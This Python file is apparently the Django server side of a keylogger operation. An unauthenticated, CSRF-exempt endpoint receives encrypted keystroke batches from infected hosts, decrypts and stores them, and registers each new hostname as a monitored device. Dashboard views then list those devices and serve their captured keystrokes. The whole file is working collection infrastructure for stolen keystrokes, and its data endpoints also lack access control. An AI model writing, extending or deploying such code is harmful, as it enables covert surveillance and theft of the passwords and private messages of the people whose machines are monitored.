# dashboard/views.py
from django.shortcuts import render, get_object_or_404
from django.http import JsonResponse, HttpResponseBadRequest, HttpResponseForbidden
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_POST, require_http_methods
from django.conf import settings # To get FERNET_KEY
from cryptography.fernet import Fernet, InvalidToken
import json
import re # For parsing log entries

from .models import MonitoredDevice, KeystrokeLog

# Initialize Fernet cipher suite (do this once, not per request)
try:
    if hasattr(settings, 'FERNET_KEY') and settings.FERNET_KEY:
        cipher_suite = Fernet(settings.FERNET_KEY)
    else:
        # This will cause an error if FERNET_KEY is not set, which is good.
        # Or, handle it more gracefully by logging and disabling decryption.
        cipher_suite = None
        print("CRITICAL: FERNET_KEY is not configured in Django settings. Decryption will fail.")
except Exception as e:
    cipher_suite = None
    print(f"CRITICAL: Failed to initialize Fernet cipher: {e}. Decryption will fail.")


# --- Main Dashboard View ---
def dashboard_home(request):
    # This view serves your main HTML dashboard page.
    # For simplicity, we assume it's protected by Django admin login or other means.
    # If you need separate login for the dashboard, use @login_required
    return render(request, 'index.html') # Assuming your dashboard HTML is index.html


# --- API Endpoint for Keylogger Client ---
@csrf_exempt
@require_POST
def receive_keystrokes(request):
    if cipher_suite is None:
        return JsonResponse({'status': 'error', 'message': 'Server encryption not configured.'}, status=500)

    # --- ADD THIS PRINT STATEMENT FOR DEBUGGING ---
    print(f"Received request body: {request.body.decode('utf-8')}")
    # --- END OF DEBUG PRINT ---

    try:
        data = json.loads(request.body.decode('utf-8'))
    except json.JSONDecodeError:
        print("Error: Invalid JSON data received.") # Add a print here too
        return HttpResponseBadRequest("Invalid JSON data.")

    client_hostname = data.get('hostname')
    encrypted_log_batch = data.get('log_data')

    # --- ADD MORE DEBUG PRINTS ---
    print(f"Parsed hostname: {client_hostname}")
    print(f"Parsed log_data (type): {type(encrypted_log_batch)}")
    if isinstance(encrypted_log_batch, str):
        print(f"Parsed log_data (first 50 chars): {encrypted_log_batch[:50]}")
    # --- END OF DEBUG PRINTS ---


    if not client_hostname or not encrypted_log_batch:
        # Be more specific in the error message if possible
        missing_fields = []
        if not client_hostname:
            missing_fields.append("'hostname'")
        if not encrypted_log_batch: # Also check if it's an empty string if that's not allowed
            missing_fields.append("'log_data'")
        error_message = f"Missing {', '.join(missing_fields)}."
        print(f"Error: {error_message} in received data.") # Print the specific error
        return HttpResponseBadRequest(error_message)

    # Get or create the device
    # This automatically handles "Identify Devices by Hostname" and "auto appear as a user"
    device, created = MonitoredDevice.objects.get_or_create(hostname=client_hostname)
    if not created: # If device already exists, its last_seen will be updated by .save()
        device.save() # Explicitly save to update last_seen

    processed_logs_count = 0
    try:
        individual_encrypted_entries = encrypted_log_batch.strip().split('\n')
        for enc_entry_str in individual_encrypted_entries:
            if not enc_entry_str:
                continue
            try:
                decrypted_bytes = cipher_suite.decrypt(enc_entry_str.encode())
                decrypted_entry_content = decrypted_bytes.decode()
                
                KeystrokeLog.objects.create(
                    device=device,
                    decrypted_content=decrypted_entry_content
                )
                processed_logs_count += 1
            except InvalidToken:
                print(f"Warning: Invalid token for one log entry from {client_hostname}. Skipping.")
                # Optionally, create a log entry indicating decryption failure
                # KeystrokeLog.objects.create(device=device, decrypted_content="[DECRYPTION FAILED FOR THIS ENTRY]")
            except Exception as e_decrypt:
                print(f"Error decrypting an entry from {client_hostname}: {e_decrypt}. Skipping.")

        if processed_logs_count > 0:
            # Update last_seen again if logs were processed, ensuring it reflects recent activity
            device.save() 
            return JsonResponse({'status': 'success', 'message': f'{processed_logs_count} log entries received and processed.'})
        else:
            return JsonResponse({'status': 'info', 'message': 'No valid log entries to process.'})

    except Exception as e_process:
        print(f"Error processing log batch from {client_hostname}: {e_process}")
        return JsonResponse({'status': 'error', 'message': 'Server error processing logs.'}, status=500)


# --- API Endpoints for the Frontend Dashboard ---

@require_http_methods(["GET"])
def list_monitored_devices(request):
    devices = MonitoredDevice.objects.filter(is_active=True).order_by('-last_seen')
    data = [{
        'id': device.id,
        'hostname': device.hostname,
        'display_name': device.get_effective_display_name(),
        'first_seen': device.first_seen.isoformat() if device.first_seen else None,
        'last_seen': device.last_seen.isoformat() if device.last_seen else None,
        'is_active': device.is_active
    } for device in devices]
    return JsonResponse(data, safe=False)

@require_http_methods(["GET"])
def get_device_logs(request, device_id):
    device = get_object_or_404(MonitoredDevice, id=device_id)
    # Add pagination later if needed
    logs = device.logs.all().order_by('-server_timestamp')[:200] # Get latest 200 logs

    log_data = [{
        'id': log.id,
        'server_timestamp': log.server_timestamp.isoformat(),
        'decrypted_content': log.decrypted_content
        # If you parse content, you can add more fields here:
        # 'client_timestamp': parsed_client_ts,
        # 'application': parsed_app_name,
        # 'keystrokes': parsed_keystrokes
    } for log in logs]
    
    response_data = {
        'device_name': device.get_effective_display_name(),
        'logs': log_data
    }
    return JsonResponse(response_data)

@csrf_exempt # If called by JS without a Django form
@require_http_methods(["POST"]) # Or PUT
def rename_device(request, device_id):
    device = get_object_or_404(MonitoredDevice, id=device_id)
    try:
        data = json.loads(request.body.decode('utf-8'))
        new_name = data.get('new_display_name', '').strip()
        if not new_name:
            return HttpResponseBadRequest("New display name cannot be empty.")
        
        device.display_name = new_name
        device.save()
        return JsonResponse({
            'status': 'success', 
            'message': 'Device renamed.',
            'id': device.id,
            'display_name': device.get_effective_display_name()
        })
    except json.JSONDecodeError:
        return HttpResponseBadRequest("Invalid JSON.")
    except Exception as e:
        return JsonResponse({'status': 'error', 'message': str(e)}, status=500)

@csrf_exempt # If called by JS without a Django form
@require_http_methods(["POST", "DELETE"]) # Allow POST for simplicity from basic HTML forms/JS
def delete_device(request, device_id):
    device = get_object_or_404(MonitoredDevice, id=device_id)
    device_name = device.get_effective_display_name()
    try:
        device.delete() # This will also cascade delete its KeystrokeLogs
        return JsonResponse({'status': 'success', 'message': f'Device "{device_name}" and its logs deleted.'})
    except Exception as e:
        return JsonResponse({'status': 'error', 'message': str(e)}, status=500)

# You can add more views like:
# - Manually add a device (though admin panel is good for this)
# - Toggle device.is_active
# - Delete individual log entries (if needed)